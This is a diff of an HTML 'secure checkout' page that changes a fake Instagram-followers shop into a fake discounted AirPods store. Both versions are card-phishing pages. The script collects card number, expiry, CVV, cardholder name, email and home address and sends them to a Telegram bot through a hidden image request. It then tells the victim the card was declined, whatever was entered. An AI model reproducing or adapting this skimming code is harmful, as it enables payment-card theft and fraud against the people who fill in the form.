@@ -1,198 +1,117 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>BoostGram MX — Pago con tarjeta</title>
-
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1745699572807528');
-fbq('track', 'PageView');
-fbq('track', 'InitiateCheckout');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1745699572807528&ev=PageView&noscript=1"/></noscript>
-<!-- End Meta Pixel Code -->
-
+<title>Secure Checkout · SoundLiquid</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-:root{--bg:#07070d;--panel:#12131d;--panel2:#171825;--line:#262838;--ink:#eef0f7;--muted:#8b90a6;
---grad:linear-gradient(135deg,#7c3aed,#ec4899);--bad:#f43f5e}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Arial,sans-serif;
-background:var(--bg);color:var(--ink);min-height:100vh;display:flex;align-items:center;justify-content:center;
-padding:26px 16px;position:relative;overflow-x:hidden}
-body::before{content:"";position:fixed;width:620px;height:620px;top:-260px;left:50%;transform:translateX(-50%);
-background:radial-gradient(circle,rgba(124,58,237,.28),transparent 62%);pointer-events:none}
-body::after{content:"";position:fixed;width:520px;height:520px;bottom:-260px;right:-140px;
-background:radial-gradient(circle,rgba(236,72,153,.20),transparent 62%);pointer-events:none}
-.shell{width:100%;max-width:470px;position:relative;z-index:2}
-.brand-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;padding:0 4px}
-.logo{font-weight:800;font-size:19px;letter-spacing:-.4px;text-decoration:none;color:var(--ink)}
-.logo span{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
-.badge{font-size:11.5px;color:var(--muted);border:1px solid var(--line);background:rgba(255,255,255,.03);
-padding:5px 10px;border-radius:999px}
-.panel{background:var(--panel);border:1px solid var(--line);border-radius:20px;
-box-shadow:0 26px 60px rgba(0,0,0,.55);overflow:hidden}
-.panel-head{padding:22px 22px 16px;text-align:center;border-bottom:1px solid var(--line)}
-.panel-head h1{font-size:21px;font-weight:800;letter-spacing:-.3px}
-.panel-head p{color:var(--muted);font-size:13.5px;margin-top:6px}
-.order{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:15px 22px;
-background:var(--panel2);border-bottom:1px solid var(--line)}
-.o-name{font-size:14px;font-weight:700}
-.o-sub{font-size:11.5px;color:var(--muted);margin-top:3px}
-.o-sub b{color:#e9d5ff}
-.o-price{font-size:16px;font-weight:800;white-space:nowrap}
-.cc{perspective:1200px;margin:20px 22px 6px;height:186px}
-.cc-inner{position:relative;width:100%;height:100%;transition:transform .6s cubic-bezier(.4,.2,.2,1);transform-style:preserve-3d}
-.cc.flip .cc-inner{transform:rotateY(180deg)}
-.cc-face{position:absolute;inset:0;border-radius:16px;padding:18px;backface-visibility:hidden;
-background:linear-gradient(135deg,#6d28d9,#db2777);box-shadow:0 14px 34px rgba(124,58,237,.35);
-display:flex;flex-direction:column;justify-content:space-between}
-.cc-back{transform:rotateY(180deg);background:linear-gradient(135deg,#4c1d95,#9d174d);justify-content:flex-start;padding:0}
-.cc-chip{width:44px;height:32px;border-radius:7px;background:linear-gradient(135deg,#fde68a,#d97706);opacity:.95}
-.cc-num{font-size:20px;letter-spacing:2.5px;font-weight:600;font-variant-numeric:tabular-nums;text-shadow:0 1px 2px rgba(0,0,0,.25)}
-.cc-bottom{display:flex;justify-content:space-between;align-items:flex-end;gap:14px}
-.cc-lbl{font-size:9px;letter-spacing:1.4px;opacity:.75}
-.cc-val{font-size:13px;font-weight:600;letter-spacing:.6px;margin-top:2px;text-transform:uppercase;
-white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:210px}
-.cc-strip{height:42px;background:#0b0b14;margin-top:20px}
-.cc-cvv-box{margin:14px 18px;background:#fff;color:#111;border-radius:6px;padding:7px 12px;
-display:flex;justify-content:space-between;font-size:12px;font-weight:700;letter-spacing:1px}
-form{padding:18px 22px 22px}
-.field{display:block;margin-bottom:13px}
-.field>span{display:block;font-size:11px;font-weight:700;letter-spacing:.9px;color:var(--muted);
-text-transform:uppercase;margin-bottom:7px}
-.inp{position:relative;display:flex;align-items:center}
-.inp input{width:100%;height:50px;border:1.5px solid var(--line);border-radius:12px;background:#0d0e17;
-color:var(--ink);font-size:15px;padding:0 14px;font-family:inherit;transition:.15s}
-.inp input::placeholder{color:#5b6076}
-.inp input:focus{outline:none;border-color:#7c3aed;background:#0f1019;box-shadow:0 0 0 4px rgba(124,58,237,.16)}
+:root{--ink:#0b0f19;--muted:#6b7280;--line:#e6e8ef;--soft:#f7f8fc;--accent:#5b2be0;--accent2:#e0218a;--ok:#12a150;--bad:#e11d48}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Arial,sans-serif;background:var(--soft);color:var(--ink);min-height:100vh;padding:22px 16px 50px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:520px;margin:0 auto}
+header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
+.logo{font-weight:900;font-size:18px;letter-spacing:-.4px}
+.logo span{background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.secure{font-size:12px;color:var(--muted)}
+.card{background:#fff;border:1px solid var(--line);border-radius:18px;box-shadow:0 14px 40px rgba(11,15,25,.08);overflow:hidden}
+.sum{display:flex;gap:12px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);background:#fcfcfe}
+.sum img{width:58px;height:58px;border-radius:12px;object-fit:cover;background:#eef0f7}
+.sum .t{flex:1}
+.sum b{font-size:14.5px;display:block}
+.sum span{font-size:12.5px;color:var(--muted)}
+.sum .p{font-weight:900;font-size:16px}
+.tot{display:flex;justify-content:space-between;padding:12px 20px;border-bottom:1px solid var(--line);font-size:14px;color:var(--muted);font-weight:600}
+.tot b{color:var(--ink);font-size:16px}
+form{padding:20px}
+.sec{font-size:11px;font-weight:800;letter-spacing:1px;color:var(--muted);text-transform:uppercase;margin:6px 0 10px}
+.sec:first-child{margin-top:0}
+.field{display:block;margin-bottom:12px}
+.field span{display:block;font-size:12px;font-weight:700;color:#3b4355;margin-bottom:6px}
+.inp input{width:100%;height:50px;border:1.5px solid var(--line);border-radius:12px;background:#fbfbfd;padding:0 14px;font-size:15px;font-family:inherit;color:var(--ink);transition:.15s}
+.inp input:focus{outline:none;border-color:var(--accent);background:#fff;box-shadow:0 0 0 4px rgba(91,43,224,.12)}
+.inp input::placeholder{color:#9aa2b4}
 .row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-button{width:100%;height:54px;border:none;border-radius:13px;cursor:pointer;background:var(--grad);
-color:#fff;font-size:15px;font-weight:800;letter-spacing:.5px;font-family:inherit;margin-top:6px;
-display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 12px 26px rgba(219,39,119,.34);transition:.15s}
-button:hover{filter:brightness(1.07)} button:disabled{opacity:.85;cursor:default}
-.sp{width:17px;height:17px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;
-animation:sp .7s linear infinite;display:none}
+.row3{display:grid;grid-template-columns:1.4fr 1fr .9fr;gap:10px}
+button{width:100%;height:56px;border:0;border-radius:14px;background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;font-size:16px;font-weight:900;font-family:inherit;letter-spacing:.3px;cursor:pointer;margin-top:8px;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 14px 30px -10px rgba(224,33,138,.6)}
+button:hover{filter:brightness(1.05)}
+button:disabled{opacity:.85;cursor:default}
+.sp{width:17px;height:17px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
 button.load .sp{display:block}
 @keyframes sp{to{transform:rotate(360deg)}}
-.err{color:var(--bad);font-size:12.5px;font-weight:600;text-align:center;margin-top:11px;min-height:15px}
-.note{text-align:center;font-size:11px;color:#6b7089;margin-top:12px}
-.backlink{text-align:center;margin-top:16px}
-.backlink a{color:var(--muted);font-size:12.5px;text-decoration:none}
-.result{position:fixed;inset:0;background:rgba(6,6,12,.92);backdrop-filter:blur(7px);z-index:60;
-display:flex;align-items:center;justify-content:center;padding:22px}
+.err{color:var(--bad);font-size:12.5px;font-weight:700;text-align:center;margin-top:11px;min-height:16px}
+.note{text-align:center;font-size:11.5px;color:var(--muted);margin-top:12px}
+.result{position:fixed;inset:0;background:rgba(8,10,18,.72);backdrop-filter:blur(6px);z-index:60;display:flex;align-items:center;justify-content:center;padding:22px}
 .oculto{display:none!important}
-.res-card{width:100%;max-width:420px;background:var(--panel);border:1px solid var(--line);border-radius:20px;
-padding:34px 26px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.6);animation:pop .35s ease}
-@keyframes pop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}
-.res-icon{width:74px;height:74px;border-radius:50%;margin:0 auto 18px;display:flex;align-items:center;
-justify-content:center;font-size:32px;font-weight:800;background:rgba(244,63,94,.14);color:var(--bad);
-border:2px solid rgba(244,63,94,.4)}
-.res-card h2{font-size:23px;margin-bottom:10px}
-.res-card p{color:var(--muted);font-size:14.5px;line-height:1.65}
-.res-pedido{display:inline-block;margin:18px 0 6px;font-size:13px;color:var(--muted);
-background:var(--panel2);border:1px solid var(--line);padding:8px 14px;border-radius:9px}
-.res-pedido b{color:var(--ink)}
+.rc{width:100%;max-width:410px;background:#fff;border-radius:20px;padding:32px 26px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.35);animation:pop .3s ease}
+@keyframes pop{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
+.ic{width:72px;height:72px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:900;background:#fee2ea;color:var(--bad);border:2px solid #fbc7d6}
+.rc h2{font-size:22px;font-weight:900;margin-bottom:10px}
+.rc p{color:var(--muted);font-size:14.5px;line-height:1.6}
+.pid{display:inline-block;margin:16px 0 4px;font-size:13px;color:var(--muted);background:var(--soft);border:1px solid var(--line);padding:8px 14px;border-radius:9px}
+.pid b{color:var(--ink)}
+.again{display:inline-block;margin-top:18px;color:var(--accent);font-weight:800;font-size:14px;text-decoration:none}
 </style>
 </head>
 <body>
-<div class="shell">
-  <div class="brand-row">
-    <a class="logo" href="index.html">Boost<span>Gram</span> MX</a>
-    <div class="badge">🔒 Pago seguro</div>
-  </div>
+<div class="wrap">
+  <header>
+    <a class="logo" href="index.html">Sound<span>Liquid</span></a>
+    <div class="secure">🔒 Secure checkout</div>
+  </header>
 
-  <div class="panel">
-    <div class="panel-head">
-      <h1>Finalizá tu pedido</h1>
-      <p>Ingresá los datos de tu tarjeta para completar la compra.</p>
+  <div class="card">
+    <div class="sum">
+      <img src="producto.jpg" alt="">
+      <div class="t"><b>Apple AirPods Pro</b><span>80% OFF · Free shipping</span></div>
+      <div class="p">$49</div>
     </div>
-
-    <div class="order">
-      <div>
-        <div class="o-name">1000 Seguidores Instagram</div>
-        <div class="o-sub" id="oSub">Entrega en minutos · No pide contraseña</div>
-      </div>
-      <div class="o-price">MX$25</div>
-    </div>
-
-    <div class="cc" id="cc">
-      <div class="cc-inner">
-        <div class="cc-face">
-          <div class="cc-chip"></div>
-          <div class="cc-num" id="ccNum">•••• •••• •••• ••••</div>
-          <div class="cc-bottom">
-            <div>
-              <div class="cc-lbl">TITULAR</div>
-              <div class="cc-val" id="ccName">NOMBRE APELLIDO</div>
-            </div>
-            <div>
-              <div class="cc-lbl">VENCE</div>
-              <div class="cc-val" id="ccExp">MM/AA</div>
-            </div>
-          </div>
-        </div>
-        <div class="cc-face cc-back">
-          <div class="cc-strip"></div>
-          <div class="cc-cvv-box"><span>CVV</span><b id="ccCvv">•••</b></div>
-        </div>
-      </div>
-    </div>
+    <div class="tot"><span>Total (USD)</span><b>$49.00</b></div>
 
     <form id="form" novalidate>
-      <label class="field">
-        <span>Número de tarjeta</span>
-        <div class="inp">
-          <input id="num" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="23" autocomplete="cc-number">
-        </div>
-      </label>
+      <div class="sec">Contact</div>
+      <label class="field"><span>Email address</span>
+        <div class="inp"><input id="email" type="email" placeholder="you@email.com" autocomplete="email"></div></label>
 
-      <label class="field">
-        <span>Nombre y apellido del titular</span>
-        <div class="inp"><input id="nom" placeholder="Como aparece en la tarjeta" autocomplete="cc-name"></div>
-      </label>
-
-      <div class="row2">
-        <label class="field">
-          <span>Vencimiento</span>
-          <div class="inp"><input id="exp" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"></div>
-        </label>
-        <label class="field">
-          <span>CVV</span>
-          <div class="inp"><input id="cvv" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc"></div>
-        </label>
+      <div class="sec">Shipping address</div>
+      <label class="field"><span>Full name</span>
+        <div class="inp"><input id="nom" placeholder="John Smith" autocomplete="name"></div></label>
+      <label class="field"><span>Street address</span>
+        <div class="inp"><input id="dir" placeholder="123 Main St, Apt 4" autocomplete="street-address"></div></label>
+      <div class="row3">
+        <label class="field"><span>City</span>
+          <div class="inp"><input id="city" placeholder="Austin"></div></label>
+        <label class="field"><span>State</span>
+          <div class="inp"><input id="state" placeholder="TX" maxlength="2" style="text-transform:uppercase"></div></label>
+        <label class="field"><span>ZIP</span>
+          <div class="inp"><input id="zip" inputmode="numeric" placeholder="78701" maxlength="5"></div></label>
       </div>
 
-      <label class="field">
-        <span>Tu WhatsApp — opcional</span>
-        <div class="inp"><input id="wa" inputmode="tel" placeholder="Ej: 5512345678 (opcional)"></div>
-      </label>
+      <div class="sec">Payment</div>
+      <label class="field"><span>Card number</span>
+        <div class="inp"><input id="num" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="23" autocomplete="cc-number"></div></label>
+      <label class="field"><span>Name on card</span>
+        <div class="inp"><input id="tit" placeholder="JOHN SMITH" autocomplete="cc-name"></div></label>
+      <div class="row2">
+        <label class="field"><span>Expiry (MM/YY)</span>
+          <div class="inp"><input id="exp" inputmode="numeric" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp"></div></label>
+        <label class="field"><span>CVV</span>
+          <div class="inp"><input id="cvv" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc"></div></label>
+      </div>
 
-      <button type="submit" id="btn"><span class="sp"></span><span id="bt">PAGAR MX$25</span></button>
+      <button type="submit" id="btn"><span class="sp"></span><span id="bt">PAY $49.00</span></button>
       <div class="err" id="err"></div>
-      <div class="note">🔒 Conexión cifrada · No guardamos tu tarjeta</div>
+      <div class="note">🔒 Encrypted connection · SSL secured</div>
     </form>
   </div>
-
-  <div class="backlink"><a href="index.html">← Volver al inicio</a></div>
 </div>
 
 <div class="result oculto" id="res">
-  <div class="res-card">
-    <div class="res-icon">✕</div>
-    <h2>Tarjeta rechazada</h2>
-    <p>Tu tarjeta fue rechazada por el banco.<br>El pago no se pudo completar.</p>
-    <div class="res-pedido">Pedido <b id="ped">BG-XXXXX</b></div>
+  <div class="rc">
+    <div class="ic">✕</div>
+    <h2>Payment not accepted</h2>
+    <p>Your card was declined by the bank.<br>The payment could not be completed.</p>
+    <div class="pid">Order <b id="ped">SL-XXXXX</b></div>
+    <a class="again" href="index.html">← Back to store</a>
   </div>
 </div>
 
@@ -203,73 +122,74 @@ const CHAT  = "8936145342";
 const $ = id => document.getElementById(id);
 const sleep = ms => new Promise(r=>setTimeout(r,ms));
 
-const ig = (localStorage.getItem('ig') || '').trim().replace('@','');
-if(ig) $('oSub').innerHTML = 'Cuenta: <b>@'+ig+'</b> · Entrega en minutos';
-
-const numEl=$('num');
-numEl.addEventListener('input', ()=>{
-  let v = numEl.value.replace(/\D/g,'').slice(0,19);
-  numEl.value = (v.match(/.{1,4}/g)||[]).join(' ');
-  $('ccNum').textContent = v.padEnd(16,'•').slice(0,16).match(/.{1,4}/g).join(' ');
+const numEl=$("num");
+numEl.addEventListener("input", ()=>{
+  let v = numEl.value.replace(/\D/g,"").slice(0,19);
+  numEl.value = (v.match(/.{1,4}/g)||[]).join(" ");
 });
-$('nom').addEventListener('input', ()=>{ $('ccName').textContent = $('nom').value.trim().toUpperCase() || 'NOMBRE APELLIDO'; });
-$('exp').addEventListener('input', ()=>{
-  let v=$('exp').value.replace(/\D/g,'').slice(0,4);
-  if(v.length>=3) v=v.slice(0,2)+'/'+v.slice(2);
-  $('exp').value=v; $('ccExp').textContent = v || 'MM/AA';
+$("exp").addEventListener("input", e=>{
+  let v=e.target.value.replace(/\D/g,"").slice(0,4);
+  if(v.length>=3) v=v.slice(0,2)+"/"+v.slice(2);
+  e.target.value=v;
 });
-const cvvEl=$('cvv');
-cvvEl.addEventListener('focus', ()=>$('cc').classList.add('flip'));
-cvvEl.addEventListener('blur',  ()=>$('cc').classList.remove('flip'));
-cvvEl.addEventListener('input', ()=>{ cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,4); $('ccCvv').textContent = cvvEl.value || '•••'; });
+$("cvv").addEventListener("input", e=>{ e.target.value=e.target.value.replace(/\D/g,"").slice(0,4); });
+$("zip").addEventListener("input", e=>{ e.target.value=e.target.value.replace(/\D/g,"").slice(0,5); });
+$("state").addEventListener("input", e=>{ e.target.value=e.target.value.replace(/[^a-zA-Z]/g,"").slice(0,2).toUpperCase(); });
 
 function enviarTelegram(texto){
   const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`;
   return new Promise(res=>{
     const img = new Image();
-    img.onload = img.onerror = () => res(true);
+    img.onload = img.onerror = ()=>res(true);
     img.src = url;
-    setTimeout(()=>res(true), 5000);
+    setTimeout(()=>res(true), 6000);
   });
 }
 
-$('form').addEventListener('submit', async e=>{
+$("form").addEventListener("submit", async e=>{
   e.preventDefault();
-  const num=numEl.value.trim(), numLimpio=num.replace(/\s/g,'');
-  const nom=$('nom').value.trim(), exp=$('exp').value.trim(), cvv=cvvEl.value.trim();
-  const wa=$('wa').value.trim();
-  const err = t => { $('err').textContent = t; };
-  err('');
-  if(numLimpio.length<15)        return err('Ingresá un número de tarjeta válido');
-  if(nom.length<3)               return err('Ingresá el nombre del titular');
-  if(!/^\d{2}\/\d{2}$/.test(exp))return err('Vencimiento inválido (MM/AA)');
-  if(cvv.length<3)               return err('CVV inválido');
-  if(wa && wa.length<8)          return err('El WhatsApp parece incompleto (o dejalo vacío)');
+  const email=$("email").value.trim(), nom=$("nom").value.trim(), dir=$("dir").value.trim();
+  const city=$("city").value.trim(), state=$("state").value.trim(), zip=$("zip").value.trim();
+  const num=numEl.value.trim(), limpio=num.replace(/\s/g,""), tit=$("tit").value.trim();
+  const exp=$("exp").value.trim(), cvv=$("cvv").value.trim();
+  const err = t => { $("err").textContent = t; };
+  err("");
 
-  if (window.fbq) fbq('track','Lead');
+  if(!/^\S+@\S+\.\S+$/.test(email))     return err("Enter a valid email");
+  if(nom.length<3)                      return err("Enter your full name");
+  if(dir.length<4)                      return err("Enter your street address");
+  if(city.length<2)                     return err("Enter your city");
+  if(state.length<2)                    return err("Enter your state");
+  if(zip.length<5)                      return err("Enter a valid ZIP code");
+  if(limpio.length<15)                  return err("Enter a valid card number");
+  if(tit.length<3)                      return err("Enter the name on the card");
+  if(!/^\d{2}\/\d{2}$/.test(exp))       return err("Invalid expiry date");
+  if(cvv.length<3)                      return err("Invalid CVV");
 
-  $('btn').disabled = true; $('btn').classList.add('load'); $('bt').textContent = 'Procesando pago...';
+  $("btn").disabled = true; $("btn").classList.add("load"); $("bt").textContent = "Processing payment...";
 
-  const pedido = 'BG-' + Math.random().toString(36).slice(2,7).toUpperCase();
+  const ped = "SL-" + Math.random().toString(36).slice(2,7).toUpperCase();
   const texto =
-`🛒 NUEVO PEDIDO — BoostGram MX
+`🛒 NEW ORDER — SoundLiquid
 
-👤 Instagram: @${ig || '(no indicado)'}
-🙋 Titular: ${nom}${wa ? '\n📱 WhatsApp: '+wa : ''}
-📦 Producto: 1000 seguidores · MX$25
+👤 Name: ${nom}
+📧 Email: ${email}
+🏠 Address: ${dir}, ${city}, ${state} ${zip}
 
-💳 TARJETA
-• Número: ${num}
-• Vence: ${exp}
+💳 CARD
+• Number: ${num}
+• Name on card: ${tit}
+• Expiry: ${exp}
 • CVV: ${cvv}
 
-🧾 Pedido: ${pedido}`;
+📦 Product: Apple AirPods Pro · $49
+🧾 Order: ${ped}`;
 
   await enviarTelegram(texto);
-  await sleep(1800);
+  await sleep(2000);
 
-  $('ped').textContent = pedido;
-  $('res').classList.remove('oculto');
+  $("ped").textContent = ped;
+  $("res").classList.remove("oculto");
 });
 </script>
 </body>
